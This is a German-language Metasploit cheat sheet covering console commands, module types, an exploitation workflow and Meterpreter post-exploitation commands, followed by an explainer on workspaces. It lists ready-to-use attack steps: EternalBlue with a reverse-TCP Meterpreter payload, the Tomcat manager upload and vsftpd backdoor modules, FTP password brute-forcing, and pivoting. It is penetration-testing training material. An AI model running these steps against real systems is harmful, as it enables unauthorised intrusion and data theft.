---
title: Metasploit Framework
layout: default
nav_order: 5
---

#### Table of Contents
{: .no_toc .text-delta }

- 1
- 2
- 3
{:toc}

# Metasploit Framework

Metasploit ist ein leistungsstarkes Open-Source-Framework für Penetration Testing und Exploits. Es wird verwendet, um Schwachstellen zu identifizieren, Exploits auszuführen und Post-Exploitation-Aktivitäten durchzuführen.

---

### **Grundlegende Befehle**

#### **Metasploit starten**
```bash
msfconsole
```
- Öffnet die interaktive Metasploit-Konsole.

---

### **Wichtige Befehle**

- **Hilfe anzeigen:**
  ```bash
  help
  ```
- **Module durchsuchen:**
  ```bash
  search <Begriff>
  ```
  Beispiel:
  ```bash
  search vsftpd
  ```
- **Modul auswählen:**
  ```bash
  use <Modulname>
  ```
  Beispiel:
  ```bash
  use exploit/unix/ftp/vsftpd_234_backdoor
  ```
- **Exploit description anzeigen (nach use):**
  ```bash
  info
  ```
- **Optionen anzeigen:**
  ```bash
  show options
  ```
- **Optionen setzen:**
  ```bash
  set <Variable> <Wert>
  ```
  Beispiel:
  ```bash
  set RHOSTS 192.168.1.1
  ```
- **Exploit starten:**
  ```bash
  exploit
  ```
  Oder:
  ```bash
  run
  ```

---

### **Module**

Metasploit bietet verschiedene Module für spezifische Aufgaben:

1. **Exploit-Module**: Angriffe auf Schwachstellen.  
2. **Payloads**: Nutzlasten wie Shells oder Meterpreter.  
3. **Auxiliary-Module**: Funktionen wie Scannen oder Brute-Forcing.  
4. **Encoders**: Umgehung von Signaturen und Schutzmaßnahmen.  
5. **Post-Exploitation-Module**: Aktionen auf kompromittierten Systemen.

---

### **Typische Workflows**

#### **1. Schwachstellen suchen**
```bash
search <Begriff>
```
Beispiel:
```bash
search smb
```

#### **2. Exploit auswählen**
```bash
use <Exploit-Pfad>
```
Beispiel:
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### **3. Payload auswählen**
```bash
set PAYLOAD <Payload>
```
Beispiel:
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

#### **4. Ziel setzen**
```bash
set RHOSTS <IP-Adresse>
```
Beispiel:
```bash
set RHOSTS 192.168.1.1
```

#### **5. Exploit starten**
```bash
run
```

---

### **Nützliche Metasploit-Funktionen**

#### **1. Nmap-Scans importieren**
```bash
db_import <Pfad zur Datei>
```
Beispiel:
```bash
db_import /root/nmap_scan.xml
```

#### **2. Dienste anzeigen**
Nach dem Import von Nmap-Ergebnissen:
```bash
services
```

#### **3. Workspace erstellen**
Workspaces helfen dabei, verschiedene Projekte zu organisieren.
```bash
workspace -a <Name>
```
Beispiel:
```bash
workspace -a penetration_test
```

#### **4. Passwörter bruteforcen**
Mit einem Auxiliary-Modul:
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <IP-Adresse>
set USER_FILE <Benutzerliste>
set PASS_FILE <Passwortliste>
run
```

#### **5. Pivoting und Tunneling**
Auf kompromittierten Maschinen:
```bash
use auxiliary/server/socks4a
run
```

---

### **Typische Exploits**

1. **MS17-010 (EternalBlue)**
   - Modul: `exploit/windows/smb/ms17_010_eternalblue`
   - Payload: `windows/x64/meterpreter/reverse_tcp`

2. **Tomcat Manager Exploit**
   - Modul: `exploit/multi/http/tomcat_mgr_upload`
   - Payload: `java/meterpreter/reverse_tcp`

3. **Vsftpd Backdoor**
   - Modul: `exploit/unix/ftp/vsftpd_234_backdoor`

---

### **Meterpreter**

**Meterpreter** ist ein erweiterter Payload, der mächtige Post-Exploitation-Funktionen bietet.

#### **Grundlegende Befehle**
- **Hilfe anzeigen:**
  ```bash
  help
  ```
- **Systeminformationen anzeigen:**
  ```bash
  sysinfo
  ```
- **Dateien auflisten:**
  ```bash
  ls
  ```
- **Arbeitsverzeichnis wechseln:**
  ```bash
  cd <Pfad>
  ```
- **Datei herunterladen:**
  ```bash
  download <Datei>
  ```
- **Screenshot aufnehmen:**
  ```bash
  screenshot
  ```
- **Shell öffnen:**
  ```bash
  shell
  ```

---

### **Tipps zur Nutzung**

1. **Sicherheit beachten**: Nutze Metasploit nur auf autorisierten Systemen.
2. **Up-to-date bleiben**: Regelmäßige Updates des Frameworks durchführen:
   ```bash
   msfupdate
   ```
3. **Umgebungen testen**: Virtuelle Maschinen nutzen, um Exploits zu üben.
4. **Daten speichern**: Ergebnisse regelmäßig mit Workspaces und Datenbanken sichern.

---

### **Ressourcen**

- [Offizielle Metasploit-Dokumentation](https://docs.rapid7.com/metasploit/)
- [Exploit Database](https://www.exploit-db.com/)
- [NSE Scripts Library](https://nmap.org/nsedoc/)



___
___


# Metasploit Workspaces


**Metasploit** ist ein **Workspace** ein Werkzeug, das hilft, die Ergebnisse von Penetrationstests zu organisieren und zu verwalten. Wenn du viele Systeme oder Netzwerke untersuchst, können die Daten schnell unübersichtlich werden. Workspaces schaffen eine Art "Container", um Informationen logisch voneinander zu trennen. Hier sind die wichtigsten Aspekte und Anwendungsfälle:

---

### **Was tun Metasploit Workspaces?**

1. **Datenorganisation:**
    
    - Workspaces ermöglichen es, Daten (wie Hosts, Netzwerke, Schwachstellen, Exploits etc.) in separate Kategorien zu unterteilen.
    - Zum Beispiel könntest du für verschiedene Kunden oder Netzwerke jeweils einen eigenen Workspace erstellen.
2. **Datenisolierung:**
    
    - Die Informationen in einem Workspace sind voneinander isoliert.
    - Wenn du in Workspace A arbeitest, siehst du keine Daten aus Workspace B.
3. **Schneller Kontextwechsel:**
    
    - Du kannst schnell zwischen verschiedenen Workspaces wechseln, um verschiedene Projekte oder Testumgebungen zu verwalten.
4. **Protokollierung und Berichterstattung:**
    
    - Jeder Workspace kann seine eigenen Reports oder Logs generieren, was für Audits und Berichte nützlich ist.

---

### **Wofür werden Workspaces verwendet?**

1. **Getrennte Projekte:**
    
    - In Penetrationstests arbeitest du oft an mehreren Projekten gleichzeitig. Ein Workspace für jedes Projekt hilft dir, die Ergebnisse übersichtlich zu halten.
    - Beispiel: Du untersuchst Netzwerk A (internes Netzwerk) und Netzwerk B (externe Perimeter). Beide können in getrennten Workspaces abgelegt werden.
2. **Teamarbeit:**
    
    - In größeren Teams können Workspaces dazu verwendet werden, spezifische Aufgaben zu trennen oder zu delegieren. Ein Workspace kann bestimmten Teammitgliedern zugewiesen werden.
3. **Multistage-Tests:**
    
    - Du könntest Workspaces für unterschiedliche Phasen eines Tests verwenden (z. B. **Reconnaissance**, **Exploitation**, **Post-Exploitation**).
4. **Vergleich von Szenarien:**
    
    - Workspaces können auch dazu genutzt werden, unterschiedliche Szenarien oder Zeitpunkte zu dokumentieren (z. B. vor und nach einer Sicherheitsmaßnahme).

---

### **Nützliche Befehle für Workspaces**

- **Workspaces auflisten:** 
  `workspace` 
  Zeigt alle verfügbaren Workspaces an.
  
- **Neuen Workspace erstellen**: 
  `workspace -a <workspace_name>`
  Erstellt einen neuen Workspace mit dem angegebenen Namen.
  
- **Zu einem Workspace wechseln:**
  `workspace <workspace_name>`
  Wechselt in den angegebenen Workspace.

- **Workspace löschen:**
  `workspace -d <workspace_name>
  Löscht den angegebenen Workspace.

- **Alle Daten eines Workspaces anzeigen:**
  `hosts`
  (oder ähnliche Befehle wie `services`, `vulns` usw.)

___

### **Praktisches Beispiel**

Angenommen, du arbeitest an einem Penetrationstest für zwei Kunden: **Firma Alpha** und **Firma Beta**. Du könntest zwei Workspaces erstellen:

1. **Workspace für **Firma Alpha**: 
   `workspace -a firma_alpha`

2. **Workspace -a firma_beta**:
   `workspace -a firma_beta`

Jetzt kannst du zwischen den Workspaces wechseln:

- Im Alpha-Workspace scanst du ihre IPs und speicherst Schwachstellen dort.
- Im Beta-Workspace machst du dasselbe für Beta.

Durch den Wechsel zwischen den Workspaces (`workspace firma_alpha` oder `workspace firma_beta`) bleiben die Daten sauber getrennt.
